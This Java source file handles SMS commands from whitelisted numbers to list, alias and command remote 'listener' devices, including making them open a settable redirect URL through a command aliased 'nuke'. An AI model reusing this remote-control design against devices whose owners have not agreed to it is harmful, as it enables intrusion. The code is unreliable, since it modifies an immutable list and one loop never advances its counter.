package net.mtraverso;

import javax.inject.Inject;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.Iterator;
import java.util.List;
import java.util.ListIterator;

public class SmsManager {

    private enum Command {
        AUTHORIZE_NUMBER("authorize", "Authorize a number to use the service", "auth"),
        DEAUTHORIZE_NUMBER("deauthorize", "Deauthorize a number from using the service", "deauth"),
        LIST_DEVICES("list", "List all devices", "ls"),
        DEVICE_OPEN_SITE("open", "Open a site on a device", "nuke"),
        ALIAS_DEVICE("alias", "Alias a device by name"),
        ALIAS_DEVICE_BY_NUMBER("alias_number", "Alias a device by number", "aliasn"),
        SET_DEVICE_REDIRECT("redirect", "Set the redirect URL for a device"),
        HELP("help", "Print this help message", "h");

        Command(String command_string, String description, String... aliases) {
            this.command_string = command_string;
            this.description = description;
            this.aliases = aliases;
        }

        private final String command_string;
        private final String description;
        private final String[] aliases;

        static Command of(String command_string) {
            for (Command command : Command.values()) { //search for the equal command_string in the enum
                if (command.command_string.equals(command_string.toLowerCase())
                        || List.of(command.aliases).contains(command_string.toLowerCase())) {
                    return command;
                }
            }
            return null;
        }
    }

    List<String> authorizedNumbers;
    RemoteOperationsManager remoteOperationsManager;

    URL redirectUrl;
    private static final String HELP_MESSAGE = getHelpMessage();

    @Inject
    public SmsManager(RemoteOperationsManager remoteOperationsManager)
            throws MalformedURLException {
        this.remoteOperationsManager = remoteOperationsManager;
        this.redirectUrl = new URL("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
        this.authorizedNumbers = List.of("+16503398121");
    }

    public void addAuthorizedNumber(String number) {
        authorizedNumbers.add(number);
    }

    public void removeAuthorizedNumber(String number) {
        authorizedNumbers.remove(number);
    }

    public boolean isAuthorizedNumber(String number) {
        return authorizedNumbers.contains(number);
    }

    public String handleSms(String from, String body) {
        if (!isAuthorizedNumber(from)) {
            return "Unauthorized number";
        }
        String[] split = body.split(" ");
        Command command = Command.of(split[0]);
        if (command == null) {
            return "Invalid command, try 'h'";
        }

        return switch (command) {
            case AUTHORIZE_NUMBER -> {
                addAuthorizedNumber(split[1]);
                yield "Authorized number: " + split[1];
            }
            case DEAUTHORIZE_NUMBER -> {
                removeAuthorizedNumber(split[1]);
                yield "Deauthorized number: " + split[1];
            }
            case LIST_DEVICES -> {
                //get only the listeners that are alive
                ListIterator<Listener> iterator = remoteOperationsManager.getListeners().stream().filter(Listener::isAlive).toList().listIterator();

                StringBuilder sb = new StringBuilder();
                while (iterator.hasNext()) {
                    Listener listener = iterator.next();
                    sb.append(iterator.nextIndex()).append(": ").append(listener.hasName() ? listener.getName() : listener.getUUID());
                    if (iterator.hasNext()) {
                        sb.append("\n");
                    }
                }
                String result = sb.toString();
                yield result.isEmpty() ? "No devices" : result;
            }
            case DEVICE_OPEN_SITE -> {
                Listener listener = Listener.getListenerByEither(remoteOperationsManager.getListeners(), split[1]);
                if (listener != null) {
                    listener.setShouldOpenSite(true);
                }
                yield listener != null ? "Successfully set " + listener.getName() + " to open site" : "No listener found";
            }
            case ALIAS_DEVICE -> {
                Listener listener = Listener.getListenerByEither(remoteOperationsManager.getListeners(), split[1]);
                if (listener != null) {
                    listener.setName(split[2]);
                }
                yield listener != null ? "Successfully aliased " + listener.getUUID() + " to " + listener.getName() : "No listener found";
            }
            case ALIAS_DEVICE_BY_NUMBER -> {
                Iterator<Listener> iterator = remoteOperationsManager.getListeners()
                        .stream()
                        .filter(Listener::isAlive)
                        .iterator();

                int i = 0;
                while (iterator.hasNext()) {
                    Listener listener = iterator.next();
                    if (i == Integer.parseInt(split[1])) {
                        listener.setName(split[2]);
                        break;
                    }
                }
                yield "Successfully aliased " + split[1] + " to " + split[2];
            }
            case SET_DEVICE_REDIRECT -> {
                try {
                    this.redirectUrl = new URL(split[1]);
                    yield "Successfully set redirect URL to " + split[1];
                } catch (MalformedURLException e) {
                    yield "Invalid URL";
                }
            }
            case HELP -> HELP_MESSAGE;
        };
    }

    private static String getHelpMessage() {
        StringBuilder sb = new StringBuilder();
        for (Command c : Command.values()) {
            sb.append(c.command_string).append(": ").append(c.description);
            if (c.aliases.length > 0) {
                sb.append(" (aliases: ");
                for (String alias : c.aliases) {
                    sb.append(alias).append(", ");
                }
                sb.delete(sb.length() - 2, sb.length());
                sb.append(")");
            }
            sb.append("\n");
        }
        return sb.toString();
    }
}
